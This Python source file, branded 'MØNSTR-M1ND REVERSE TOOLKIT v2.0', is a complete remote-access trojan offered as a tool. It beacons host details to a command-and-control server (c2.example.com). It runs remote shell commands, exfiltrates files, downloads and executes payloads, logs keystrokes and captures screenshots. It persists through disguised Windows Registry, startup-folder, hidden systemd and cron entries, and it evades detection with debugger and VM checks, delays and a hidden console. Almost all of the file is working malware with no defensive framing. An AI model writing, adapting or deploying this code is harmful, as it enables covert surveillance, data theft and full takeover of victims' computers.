import socket
import threading
import subprocess
import os
import sys
import json
import base64
import time
import ctypes
import tempfile
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests
import platform
import psutil
import shutil

C2_SERVER = "c2.example.com"
C2_PORT = 443
RECONNECT_INTERVAL = 30
AES_KEY = b'SixteenByteKey!!'
INITIAL_DELAY = 120

def establish_persistence():
    system = platform.system()
    
    if system == "Windows":
        try:
            if ctypes.windll.shell32.IsUserAnAdmin():
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                key = ctypes.windll.advapi32.RegOpenKeyW(0x80000002, key_path, 0, 0x20006)
                ctypes.windll.advapi32.RegSetValueExW(key, "WindowsDefenderUpdate", 0, 1, f"{sys.executable} {__file__}".encode('utf-16le') + b'\x00\x00')
                ctypes.windll.advapi32.RegCloseKey(key)
        except:
            pass
        
        startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        if os.path.exists(startup_path):
            bat_path = os.path.join(startup_path, 'WindowsDefender.bat')
            with open(bat_path, 'w') as f:
                f.write(f'start /min pythonw.exe "{os.path.abspath(__file__)}"')
    
    elif system == "Linux":
        service_content = f"""[Unit]
Description=System Security Audit
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target"""
        
        try:
            with open('/etc/systemd/system/.security-audit.service', 'w') as f:
                f.write(service_content)
            os.system('systemctl enable .security-audit.service 2>/dev/null')
        except:
            pass
        
        cron_cmd = f"@reboot sleep 60 && python3 {os.path.abspath(__file__)} >/dev/null 2>&1"
        try:
            with open('/tmp/cronjob', 'w') as f:
                f.write(cron_cmd + '\n')
            os.system('crontab /tmp/cronjob 2>/dev/null')
            os.remove('/tmp/cronjob')
        except:
            pass

class CommsEncryptor:
    def __init__(self, key):
        self.key = pad(key, 32)[:32]
        self.iv = b'InitializationVe'
    
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        return base64.b64encode(self.iv + cipher.encrypt(pad(data.encode(), 16)))
    
    def decrypt(self, enc_data):
        enc_data = base64.b64decode(enc_data)
        iv = enc_data[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(enc_data[16:]), 16).decode()

class ReverseShell:
    def __init__(self, encryptor):
        self.encryptor = encryptor
        self.session_id = base64.b64encode(os.urandom(8)).decode()[:12]
        self.running = True
        
    def beacon(self):
        system_info = {
            'id': self.session_id,
            'hostname': platform.node(),
            'os': platform.platform(),
            'user': os.getenv('USER') or os.getenv('USERNAME'),
            'ip': self.get_local_ip(),
            'pid': os.getpid(),
            'timestamp': time.time(),
            'privilege': 'admin' if self.is_admin() else 'user'
        }
        return self.encryptor.encrypt(json.dumps(system_info))
    
    def execute_command(self, cmd):
        try:
            if platform.system() == "Windows":
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
            else:
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, executable='/bin/bash', timeout=30)
            return result.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "[TIMEOUT] Command execution timed out"
        except Exception as e:
            return f"[ERROR] {str(e)}"
    
    def upload_file(self, local_path, remote_path):
        try:
            with open(local_path, 'rb') as f:
                content = base64.b64encode(f.read()).decode()
            return self.encryptor.encrypt(json.dumps({
                'action': 'upload',
                'path': remote_path,
                'content': content
            }))
        except Exception as e:
            return self.encryptor.encrypt(json.dumps({'error': str(e)}))
    
    def download_and_execute(self, url):
        try:
            response = requests.get(url, timeout=30)
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.exe')
            temp_file.write(response.content)
            temp_file.close()
            subprocess.Popen(temp_file.name, shell=True)
            return self.encryptor.encrypt("[SUCCESS] Payload executed")
        except Exception as e:
            return self.encryptor.encrypt(f"[ERROR] {str(e)}")
    
    def keylogger_start(self):
        def log_keys():
            import keyboard
            log_file = os.path.join(tempfile.gettempdir(), f'kl_{self.session_id}.log')
            with open(log_file, 'a') as f:
                keyboard.hook(lambda e: f.write(f"{time.time()}:{e.name}\n"))
            keyboard.wait()
        
        thread = threading.Thread(target=log_keys, daemon=True)
        thread.start()
        return self.encryptor.encrypt("[KEYLOGGER] Started")
    
    def get_local_ip(self):
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "127.0.0.1"
    
    def is_admin(self):
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False

class C2Client:
    def __init__(self, server, port, encryptor):
        self.server = server
        self.port = port
        self.encryptor = encryptor
        self.shell = ReverseShell(encryptor)
        self.connection = None
        
    def connect(self):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.settimeout(30)
                self.connection.connect((self.server, self.port))
                beacon_data = self.shell.beacon()
                self.connection.send(len(beacon_data).to_bytes(4, 'big'))
                self.connection.send(beacon_data)
                return True
            except Exception:
                time.sleep(RECONNECT_INTERVAL)
                continue
    
    def handle_commands(self):
        while True:
            try:
                length_data = self.connection.recv(4)
                if not length_data:
                    break
                
                cmd_length = int.from_bytes(length_data, 'big')
                encrypted_cmd = self.connection.recv(cmd_length)
                
                if not encrypted_cmd:
                    break
                
                command = self.encryptor.decrypt(encrypted_cmd)
                cmd_data = json.loads(command)
                
                response = self.execute_action(cmd_data)
                
                self.connection.send(len(response).to_bytes(4, 'big'))
                self.connection.send(response)
                
            except Exception:
                break
    
    def execute_action(self, cmd_data):
        action = cmd_data.get('action')
        
        if action == 'cmd':
            result = self.shell.execute_command(cmd_data['command'])
            return self.encryptor.encrypt(result)
        
        elif action == 'upload':
            return self.shell.upload_file(cmd_data['local'], cmd_data['remote'])
        
        elif action == 'download':
            return self.shell.download_and_execute(cmd_data['url'])
        
        elif action == 'keylog':
            return self.shell.keylogger_start()
        
        elif action == 'screenshot':
            return self.take_screenshot()
        
        elif action == 'persist':
            establish_persistence()
            return self.encryptor.encrypt("[PERSISTENCE] Established")
        
        elif action == 'kill':
            os._exit(0)
        
        else:
            return self.encryptor.encrypt(f"[ERROR] Unknown action: {action}")
    
    def take_screenshot(self):
        try:
            if platform.system() == "Windows":
                import win32gui, win32ui, win32con, win32api
                from PIL import Image
                
                hdesktop = win32gui.GetDesktopWindow()
                width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
                height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
                
                desktop_dc = win32gui.GetWindowDC(hdesktop)
                img_dc = win32ui.CreateDCFromHandle(desktop_dc)
                mem_dc = img_dc.CreateCompatibleDC()
                
                screenshot = win32ui.CreateBitmap()
                screenshot.CreateCompatibleBitmap(img_dc, width, height)
                mem_dc.SelectObject(screenshot)
                mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)
                
                bmpinfo = screenshot.GetInfo()
                bmpstr = screenshot.GetBitmapBits(True)
                
                im = Image.frombuffer('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX', 0, 1)
                
                temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
                im.save(temp_file.name)
                temp_file.close()
                
                with open(temp_file.name, 'rb') as f:
                    content = base64.b64encode(f.read()).decode()
                os.unlink(temp_file.name)
                
                return self.encryptor.encrypt(json.dumps({'screenshot': content}))
                
            else:
                import pyscreenshot as ImageGrab
                im = ImageGrab.grab()
                temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
                im.save(temp_file.name)
                
                with open(temp_file.name, 'rb') as f:
                    content = base64.b64encode(f.read()).decode()
                os.unlink(temp_file.name)
                
                return self.encryptor.encrypt(json.dumps({'screenshot': content}))
                
        except Exception as e:
            return self.encryptor.encrypt(f"[SCREENSHOT ERROR] {str(e)}")

def main():
    try:
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                os._exit(1)
    except:
        pass
    
    vm_indicators = ['vmware', 'virtualbox', 'qemu', 'xen']
    system_info = platform.system().lower() + platform.release().lower()
    if any(indicator in system_info for indicator in vm_indicators):
        time.sleep(3600)
    
    time.sleep(INITIAL_DELAY)
    
    establish_persistence()
    
    encryptor = CommsEncryptor(AES_KEY)
    client = C2Client(C2_SERVER, C2_PORT, encryptor)
    
    while True:
        try:
            if client.connect():
                client.handle_commands()
        except Exception:
            time.sleep(RECONNECT_INTERVAL)
            continue

if __name__ == "__main__":
    print("MØNSTR-M1ND REVERSE TOOLKIT v2.0")
    print("Created by MØNSTR-M1ND")
    print("All rights reserved.")
    
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    if os.name == 'posix':
        if os.fork():
            sys.exit()
    
    thread = threading.Thread(target=main, daemon=True)
    thread.start()
    
    while True:
        time.sleep(3600)